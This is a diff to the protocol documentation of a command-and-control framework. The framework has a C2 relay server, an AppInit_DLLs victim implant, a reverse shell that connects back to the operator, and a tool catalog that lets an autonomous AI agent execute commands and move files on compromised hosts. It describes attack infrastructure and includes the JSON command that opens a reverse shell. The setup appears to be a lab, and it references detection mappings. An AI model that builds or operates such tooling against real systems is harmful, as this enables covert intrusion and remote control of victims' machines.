@@ -14,6 +14,31 @@
 
 ### 1.2 State Machine & Roles
 
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Op as Operator (client.py / agent_tools.py)
+    participant Srv as C2 Server (server.py :4444)
+    participant Imp as Victim Implant (AppInit_DLLs.dll)
+
+    Note over Op,Srv: TCP Connection Established
+    Op->>Srv: {"token": "secret123", "role": "operator"}
+    Srv-->>Op: {"status": "ok", "message": "Authenticated as operator"}
+
+    Note over Imp,Srv: Implant Connects Back
+    Imp->>Srv: {"token": "secret123", "role": "agent"}
+    Srv-->>Imp: {"status": "ok", "message": "Authenticated as agent"}
+
+    Note over Op,Imp: Command Relay & Push Broadcast Active
+    Op->>Srv: {"module": "notify", "payload": {"action": "start"}}
+    Srv->>Imp: Forwarded Command
+    Imp-->>Srv: {"status": "ok"}
+    Srv-->>Op: {"status": "ok"}
+
+    Imp--)Srv: Push Event: {"event": "window_focus", ...}
+    Srv--)Op: Broadcast Event: {"event": "window_focus", ...}
+```
+
 ```
 [TCP Connect] ──▶ [Unauthenticated State]
                         │
@@ -61,7 +86,7 @@ Immediately upon establishing a TCP connection, the client (operator or victim i
 
 ---
 
-## 3. Command & Response Schemas
+## 3. Command Routing & Hybrid Dispatch Engine
 
 Once authenticated, operators submit module requests formatted as:
 ```json
@@ -74,7 +99,27 @@ Once authenticated, operators submit module requests formatted as:
 }
 ```
 
-The C2 relay handles local modules ([`activity_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/activity_module.py), [`rdp_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/rdp_module.py), [`registry_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/registry_module.py), [`ssh_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/ssh_module.py)) or forwards victim-targeted commands to the connected DLL implant.
+### 3.0 Hybrid Dispatch Decision Architecture
+`server.py` evaluates the requested `module`:
+
+```
+                 Incoming Operator Command
+                            │
+               Is module in server MODULES?
+             (ssh, rdp, registry, activity)
+                     /              \
+                   YES               NO
+                   /                  \
+        Execute locally via      Forward via relay_to_agent()
+        Python / psutil on       to AppInit_DLLs.dll on victim
+        Server Host              (e.g., notify, shell)
+                   \                  /
+                    ▼                ▼
+                 Return Synchronous JSON Response
+```
+
+1. **Server-Side Python Modules**: Handled locally by [`activity_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/activity_module.py), [`rdp_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/rdp_module.py), [`registry_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/registry_module.py), or [`ssh_module.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/modules/ssh_module.py).
+2. **Victim Implant Modules**: Forwarded over the active TCP connection to `AppInit_DLLs.dll` (`dll.cpp`) via `forward()` with a 30-second response timeout. If no agent is connected, the server immediately returns `{"status": "error", "message": "No agent connected — is the DLL running on the target?"}`.
 
 ---
 
@@ -177,25 +222,40 @@ Push events originate from the victim agent and are broadcasted by the server to
 
 ## 5. Out-of-Band Direct Reverse Shell Protocol
 
-To support interactive command-line operations without JSON encapsulation delays, the shell channel operates out-of-band:
+To support interactive command-line operations without JSON encapsulation delays, the shell channel operates completely out-of-band:
 
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Op as Operator (client.py listener)
+    participant Srv as C2 Relay Server (:4444)
+    participant Imp as Victim Implant (dll.cpp)
+    participant Cmd as Target Shell (cmd.exe)
+
+    Note over Op: 1. Operator binds local listener on port 4445
+    Op->>Srv: JSON Command: {"module": "shell", "payload": {"action": "open", "host": "<operator_ip>", "port": 4445}}
+    Srv->>Imp: Forwarded via relay_to_agent()
+    Imp->>Cmd: Spawns cmd.exe with redirected stdio pipes
+    Imp->>Op: 2. Establishes raw TCP connection to <operator_ip>:4445
+    Note over Op,Cmd: Direct Duplex Stream Active (VT100 / Raw Bytes)
+    Op->>Cmd: "whoami\r\n"
+    Cmd-->>Op: "victim-pc\\labuser\r\n"
+    Note over Op: Ctrl+] detaches console; socket remains alive
 ```
-Step 1: Operator opens listener on port 4445
-Step 2: Operator dispatches JSON instruction to agent:
-        {"module": "shell", "payload": {"action": "open", "host": "<operator_ip>", "port": 4445}}
-Step 3: Agent connects direct raw TCP to <operator_ip>:4445
-Step 4: Standard duplex streaming (raw bytes, vt100 / cmd.exe stream)
-```
+
 - The stream passes directly between the victim socket and the operator terminal.
 - Disconnecting the shell does not disrupt the primary C2 JSON stream on port `4444`.
 
 ---
 
-## 6. FastMCP Tool Catalog Reference
+## 6. AI Agent Tool Ecosystem
 
-When integrating with external LLMs via [`c2_server/mcp/c2_project_mcp.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/mcp/c2_project_mcp.py), all capabilities are mapped to standardized tools:
+The framework provides two distinct interfaces for automated and AI-driven interactions:
 
-| MCP Tool Name | Target Module | Description | Mutating? |
+### 6.1 Operational Agent Tool Catalog ([`agent/agent_tools.py`](file:///Users/matanmishali/AntiGravity/AgentRed/agent/agent_tools.py))
+Wraps the C2 client for the autonomous AI operator (`agent_tui.py` / `agent.py`). These 38 tools interact directly with live sessions:
+
+| Tool Name | Target Module | Description | Mutating? |
 | :--- | :--- | :--- | :--- |
 | `sysinfo` | `activity:sysinfo` | Query OS, build, hostname, uptime | No |
 | `processes` | `activity:processes` | List all running processes | No |
@@ -210,4 +270,35 @@ When integrating with external LLMs via [`c2_server/mcp/c2_project_mcp.py`](file
 | `ssh_exec` | `ssh:exec` | Run a remote command via SSH | **Yes** |
 | `rdp_open` | `rdp:open` | Launch an RDP connection session | **Yes** |
 | `shell_open` | `shell:open` | Spawn a direct interactive reverse shell | **Yes** |
+| `shell_exec` | `shell` channel | Execute command over established reverse shell | **Yes** |
+| `file_read` | `shell` channel | Read target file via `type` | No |
+| `file_send` | `shell` channel | Upload local file via base64 `certutil` decode | **Yes** |
 | `notify_popup` | `notify:popup` | Display a desktop dialog box | **Yes** |
+
+### 6.2 Code Intelligence MCP Server ([`c2_server/mcp/c2_project_mcp.py`](file:///Users/matanmishali/AntiGravity/AgentRed/c2_server/mcp/c2_project_mcp.py))
+Provides read-only AST parsing, code intelligence, and detection mapping for IDE assistants (Cursor, Claude Desktop, Hermes):
+- `project_overview`: Architecture, wire transport, and known code audit notes.
+- `list_modules` / `module_detail`: Live source parser indexing every module, action, parameter, and dispatch status.
+- `search_code`: Sandboxed regex search across project sources.
+- `read_source`: Sandboxed line-numbered source viewer.
+- `local_activity`: Safe in-process test harness for local `psutil` profiling.
+- `hunting_notes`: ATT&CK mapping and detection engineering references.
+
+---
+
+## 7. Machine-Readable Schema Specification
+
+A formal JSON Schema (Draft-07) defining all wire framing, authentication handshakes, module payloads, and push events is maintained in:
+
+📄 **[`docs/protocol_schema.json`](file:///Users/matanmishali/AntiGravity/AgentRed/docs/protocol_schema.json)**
+
+You can validate any message or batch of messages programmatically:
+```python
+import json, jsonschema
+
+with open("docs/protocol_schema.json") as f:
+    schema = json.load(f)
+
+# Validates handshake, request, response, or push event
+jsonschema.validate(instance={"token": "secret123", "role": "operator"}, schema=schema)
+```
